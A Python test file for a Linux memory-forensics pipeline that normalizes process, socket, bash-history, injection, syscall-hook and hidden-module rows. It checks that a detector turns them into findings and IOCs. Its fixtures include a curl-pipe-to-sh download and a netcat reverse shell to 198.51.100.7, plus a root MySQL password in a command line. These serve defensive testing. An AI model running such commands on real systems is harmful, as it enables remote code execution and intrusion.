# ruff: noqa: E501 - literal rows
"""Linux normalizers over the replay row fixtures (pure Python): phase-1 fixture counts,
the `bash` keys phase 3 reads (command / time), sockets, open files, regions, hooks and
hidden modules."""

from pathlib import Path
from typing import Any

from cyberlab_jobs.memory import MemoryPlugin

from memory_worker import detections
from memory_worker.normalize.models import COLUMNS
from tests.replay_helpers import (
    LIMITS,
    artifact_types,
    contract_fixture_counts,
    kinds,
    normalized,
    run_scenario,
    scenario_rows,
)

P = MemoryPlugin
RECORD_KINDS = ("process", "connection", "injection", "artifact")


def _row(plugin: MemoryPlugin, **values: Any) -> dict[str, Any]:
    return {column: None for column in COLUMNS[plugin]} | values


def test_triage_matches_the_phase_1_fixture_counts(tmp_path: Path) -> None:
    lines = run_scenario("linux", "triage", tmp_path / "r.gz")
    fixture, fixture_artifacts = contract_fixture_counts("linux_triage.ndjson")
    got = kinds(lines)
    assert {k: got[k] for k in RECORD_KINDS} == {k: fixture[k] for k in RECORD_KINDS}
    assert artifact_types(lines) == fixture_artifacts
    header, image = lines[0], lines[1]
    assert header.os == "linux" and [p.plugin for p in header.plugins] == [
        P.LINUX_PSLIST,
        P.LINUX_PSAUX,
        P.LINUX_BASH,
        P.LINUX_SOCKSTAT,
    ]
    assert image.layer == "LimeLayer" and image.kernel_banner.startswith("Linux version 6.1.0")
    assert image.pdb is None and image.system_time is None


def test_full_adds_files_regions_hooks_and_hidden_modules(tmp_path: Path) -> None:
    lines = run_scenario("linux", "full", tmp_path / "r.gz")
    assert artifact_types(lines) == {
        "bash": 2,
        "open_file": 2,
        "syscall_hook": 1,
        "hidden_module": 1,
    }
    assert kinds(lines)["injection"] == 1
    assert [p.status for p in lines[0].plugins] == ["ok"] * 8


def test_bash_artifacts_carry_the_detector_keys() -> None:
    out = normalized("linux", scenario_rows("linux"))
    history = [a for a in out.artifacts if a.type == "bash"]
    assert [a.attributes for a in history] == [
        {"command": "mysql -u root -pHunter2pass appdb", "time": "2026-11-01T08:06:00Z"},
        {"command": "curl -s http://198.51.100.7/x.sh | sh", "time": "2026-11-01T08:07:00Z"},
    ]
    assert {a.pid for a in history} == {1030}
    # Phase 3 reads exactly these keys: the history line becomes a finding and IOCs.
    found = detections.run(detections_view(out), LIMITS)
    assert "mem_shell_history_pattern" in {f.type for f in found.findings}
    assert "http://198.51.100.7/x.sh" in {i.value for i in found.iocs}


def detections_view(out: Any) -> Any:
    from cyberlab_jobs.memory import MemoryImageRecord, MemoryProfile

    from memory_worker.view import MemoryView

    image = MemoryImageRecord(size_bytes=1, sha256="b" * 64, layer="LimeLayer", arch="x64")
    return MemoryView(
        os="linux",
        profile=MemoryProfile.FULL,
        image=image,
        processes=tuple(out.processes),
        connections=tuple(out.connections),
        injections=tuple(out.injections),
        artifacts=tuple(out.artifacts),
    )


def test_processes_and_cmdlines() -> None:
    out = normalized("linux", scenario_rows("linux"))
    by_pid = {p.pid: p for p in out.processes}
    assert len(out.processes) == 9 and all(p.sources == ["pslist"] for p in out.processes)
    assert by_pid[1102].cmdline == "nc -e /bin/sh 198.51.100.7 4444" and by_pid[1102].ppid == 1101
    assert by_pid[2].cmdline == "[kthreadd]"


def test_sockets() -> None:
    out = normalized("linux", scenario_rows("linux"))
    listen, established, unix = out.connections
    assert (listen.proto, listen.local_port, listen.state) == ("tcp", 22, "LISTEN")
    assert (str(established.remote_addr), established.remote_port, established.owner) == (
        "198.51.100.7",
        4444,
        "nc",
    )
    assert unix.proto == "unix" and unix.local_addr is None and unix.local_port is None


def test_socket_families_and_thread_duplicates() -> None:
    rows = {
        P.LINUX_SOCKSTAT: [
            _row(
                P.LINUX_SOCKSTAT,
                PID=5,
                **{
                    "Sock Offset": 1,
                    "Family": "AF_INET6",
                    "Proto": "UDP",
                    "Source Addr": "::1",
                    "Source Port": "53",
                },
            ),
            _row(
                P.LINUX_SOCKSTAT,
                PID=5,
                TID=6,
                **{"Sock Offset": 1, "Family": "AF_INET6", "Proto": "UDP"},
            ),  # same socket, other thread
            _row(
                P.LINUX_SOCKSTAT,
                PID=5,
                **{"Sock Offset": 2, "Family": "AF_INET", "Type": "RAW", "Proto": "ICMP"},
            ),
            _row(
                P.LINUX_SOCKSTAT,
                PID=5,
                **{
                    "Sock Offset": 3,
                    "Family": "AF_NETLINK",
                    "Proto": "NETLINK_ROUTE",
                    "Source Port": "notaport",
                },
            ),
            _row(
                P.LINUX_SOCKSTAT,
                PID=5,
                **{
                    "Sock Offset": 4,
                    "Family": "AF_INET",
                    "Proto": "TCP",
                    "Source Addr": "fe80::1%eth0",
                    "Source Port": "99999",
                },
            ),
        ]
    }
    out = normalized("linux", rows)
    assert [c.proto for c in out.connections] == ["udp", "raw", "other", "tcp"]
    assert out.connections[0].local_port == 53
    assert out.connections[3].local_addr is None and out.connections[3].local_port is None


def test_regions_hooks_files_and_hidden_modules() -> None:
    out = normalized("linux", scenario_rows("linux"))
    (region,) = out.injections
    assert region.private is True and region.protection == "rwx" and not region.has_pe
    by_type: dict[str, list[Any]] = {}
    for a in out.artifacts:
        by_type.setdefault(a.type, []).append(a)
    assert [a.attributes["fd"] for a in by_type["open_file"]] == [0, 3]  # thread duplicate dropped
    (hook,) = by_type["syscall_hook"]
    assert hook.attributes == {
        "table": "64bit",
        "index": 62,
        "handler": "0xffffffffc08a1000",
        "table_address": "0xffffffff82400300",
    }
    (hidden,) = by_type["hidden_module"]
    assert hidden.attributes["name"] == "rootkit_x" and hidden.attributes["code_size"] == 0x4000
    assert "args" not in hidden.attributes  # empty load arguments are dropped


def test_file_backed_regions_are_not_private() -> None:
    rows = {
        P.LINUX_MALFIND: [
            _row(
                P.LINUX_MALFIND,
                PID=9,
                Start=0x1000,
                End=0x1FFF,
                Path="/usr/lib/libjit.so",
                Protection="rwx",
                Hexdump="4d5a",
            )
        ]
    }
    (region,) = normalized("linux", rows).injections
    assert region.private is False and region.has_pe  # an MZ head too short to show e_lfanew
